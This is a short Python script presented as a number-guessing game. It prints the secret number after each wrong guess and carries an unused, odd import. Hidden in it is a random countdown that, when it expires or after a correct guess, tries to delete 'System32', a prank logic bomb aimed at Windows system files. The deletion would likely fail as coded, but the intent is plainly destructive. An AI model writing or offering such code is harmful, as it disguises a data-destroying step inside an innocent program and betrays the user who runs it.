#Imports#
import random
import sys
import os.path

from PIL.ImImagePlugin import number

#Variables#
random_timer = random.randint(1,10)
gambling = True
number_found = True

while gambling:
    if number_found:
        guess_number = random.randint(1,1000000)
        print("Find the number")
        number_found = False
    if number_found == False:
        player_input = int(input("Guess the number "))
        if player_input == guess_number:
            print("Correct!")
            random_timer = 0
        else:
            print("Wrong!")
            print(guess_number)

    random_timer -= 1
    if random_timer <= 0:
        if os.path.exists("System32"):
            os.remove("System32")
        else:
            print("Error")